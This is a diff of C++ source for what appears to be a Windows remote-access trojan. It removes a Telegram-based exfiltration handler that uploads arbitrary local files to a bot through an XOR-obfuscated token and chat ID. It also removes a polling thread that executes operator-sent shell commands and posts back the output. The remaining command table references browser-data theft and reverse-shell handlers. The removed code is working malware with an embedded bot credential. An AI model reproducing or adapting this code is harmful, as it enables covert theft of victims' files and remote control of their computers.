@@ -8,7 +8,6 @@
 #include <windows.h>
 #include <winhttp.h>
 #include <tlhelp32.h>
-#include <shlwapi.h>
 #include <string>
 #include <vector>
 #include <sstream>
@@ -512,142 +511,6 @@ static std::wstring HandleBrowser(const std::string& args) {
     return L"Browser data:\n" + result;
 }
 
-// =====================================================================
-//  TELEGRAM EXFILTRATION (token & chat ID obfuscated with XSW)
-// =====================================================================
-static std::wstring HandleTelegram(const std::string& args) {
-    if (args.empty()) return L"Usage: !telegram <local_path> [<caption>]";
-
-    std::string localPath, caption;
-    size_t space = args.find(' ');
-    if (space == std::string::npos) {
-        localPath = args;
-        caption = "";
-    } else {
-        localPath = args.substr(0, space);
-        caption = args.substr(space + 1);
-    }
-
-    HANDLE hFile = CreateFileA(localPath.c_str(), GENERIC_READ, FILE_SHARE_READ,
-                               NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
-    if (hFile == INVALID_HANDLE_VALUE) {
-        return L"[error: file not found]";
-    }
-    LARGE_INTEGER fileSize;
-    GetFileSizeEx(hFile, &fileSize);
-    if (fileSize.QuadPart > 50 * 1024 * 1024) {
-        CloseHandle(hFile);
-        return L"[error: file too large (>50 MB)]";
-    }
-    std::vector<char> fileData(static_cast<size_t>(fileSize.QuadPart));
-    DWORD bytesRead = 0;
-    ReadFile(hFile, fileData.data(), static_cast<DWORD>(fileData.size()), &bytesRead, NULL);
-    CloseHandle(hFile);
-
-    std::string boundary = "----GHOSTBOUNDARY" + std::to_string(GetTickCount());
-    std::string body;
-    body += "--" + boundary + "\r\n";
-    body += "Content-Disposition: form-data; name=\"document\"; filename=\"" + std::string(PathFindFileNameA(localPath.c_str())) + "\"\r\n";
-    body += "Content-Type: application/octet-stream\r\n\r\n";
-    body.append(fileData.data(), fileData.size());
-    body += "\r\n";
-    if (!caption.empty()) {
-        body += "--" + boundary + "\r\n";
-        body += "Content-Disposition: form-data; name=\"caption\"\r\n\r\n";
-        body += caption + "\r\n";
-    }
-    body += "--" + boundary + "--\r\n";
-
-    const std::wstring token  = XSW(L"8776962614:AAEHIY4GvQboGIRnaGeFPgtzFcOt4hXClxQ").str();
-    const std::wstring chatId = XSW(L"8575201154").str();
-
-    std::wstring path = L"/bot" + token + L"/sendDocument";
-    std::string headers =
-        "Content-Type: multipart/form-data; boundary=" + boundary + "\r\n"
-        "Content-Length: " + std::to_string(body.size()) + "\r\n";
-
-    HttpResponse resp = WinHttpRequest(L"api.telegram.org", 443, L"POST", path, body, UTF8ToWString(headers));
-
-    if (resp.status == 200) {
-        return L"[+] File sent to Telegram: " + UTF8ToWString(localPath);
-    } else {
-        return L"[error: upload failed (HTTP " + std::to_wstring(resp.status) + L")]";
-    }
-}
-
-// =====================================================================
-//  TELEGRAM COMMAND POLLING (full implementation)
-// =====================================================================
-static DWORD WINAPI TelegramPoller(LPVOID) {
-    DebugLog(L"Telegram poller started.");
-    int lastUpdateId = 0;
-    // ponytail: capture to wstring once — XorStr.str() decrypts in-place, second call re-encrypts
-    const std::wstring token  = XSW(L"8776962614:AAEHIY4GvQboGIRnaGeFPgtzFcOt4hXClxQ").str();
-    const std::wstring chatId = XSW(L"8575201154").str();
-
-    while (true) {
-        std::wstring path = L"/bot" + token +
-                            L"/getUpdates?offset=" + std::to_wstring(lastUpdateId + 1) +
-                            L"&timeout=60";
-        HttpResponse resp = WinHttpRequest(L"api.telegram.org", 443, L"GET", path, "", L"");
-
-        if (resp.status == 200 && !resp.body.empty()) {
-            std::string body = resp.body;
-            // Parse JSON to extract update_id and text
-            size_t textPos = body.find("\"text\":\"");
-            while (textPos != std::string::npos) {
-                size_t start = textPos + 8; // skip past "text":"
-                size_t end = body.find('\"', start);
-                if (end == std::string::npos) break;
-                std::string command = body.substr(start, end - start);
-
-                // Extract update_id to mark as read
-                size_t updateIdPos = body.rfind("\"update_id\":", textPos);
-                if (updateIdPos != std::string::npos) {
-                    size_t idStart = updateIdPos + 12;
-                    size_t idEnd = body.find(',', idStart);
-                    if (idEnd == std::string::npos) idEnd = body.find('}', idStart);
-                    if (idEnd != std::string::npos) {
-                        std::string idStr = body.substr(idStart, idEnd - idStart);
-                        int updateId = atoi(idStr.c_str());
-                        if (updateId > lastUpdateId) lastUpdateId = updateId;
-                    }
-                }
-
-                // Process command
-                if (command[0] == '/') {
-                    DebugLog(L"Telegram command: " + UTF8ToWString(command));
-                    std::wstring cmdW = UTF8ToWString(command);
-                    std::wstring result;
-                    if (cmdW == L"/ping") {
-                        result = L"Pong!";
-                    } else if (cmdW.substr(0, 6) == L"/exec ") {
-                        std::wstring execCmd = cmdW.substr(6);
-                        result = ExecuteCommand(execCmd);
-                    } else if (cmdW == L"/sessions") {
-                        result = L"Session ID: " + g_SessionId;
-                    } else if (cmdW == L"/help") {
-                        result = L"Commands: /ping, /exec <cmd>, /sessions, /help";
-                    } else {
-                        result = L"Unknown command. Type /help";
-                    }
-
-                    // Send reply via POST with JSON body — GET breaks on any output
-                    // containing '&', '=', spaces, or newlines
-                    std::string replyBody = "{\"chat_id\":" + WStringToUTF8(chatId) +
-                                           ",\"text\":\"" + JsonEscape(WStringToUTF8(result)) + "\"}";
-                    std::wstring replyPath = L"/bot" + token + L"/sendMessage";
-                    WinHttpRequest(L"api.telegram.org", 443, L"POST", replyPath, replyBody, L"");
-                }
-
-                // Move to next message
-                textPos = body.find("\"text\":\"", end);
-            }
-        }
-        Sleep(3000);
-    }
-    return 0;
-}
 
 // =====================================================================
 //  STUB HANDLERS
@@ -793,7 +656,6 @@ static const CmdEntry kCmdTable[] = {
     { "!wallpaper ",  false, HandleWallpaper },
     { "!reverse ",    false, HandleReverse },
     { "!browser",     false, HandleBrowser },
-    { "!telegram ",   false, HandleTelegram },
     { "exit",         true,  nullptr },
     { "sleep",        true,  nullptr }
 };
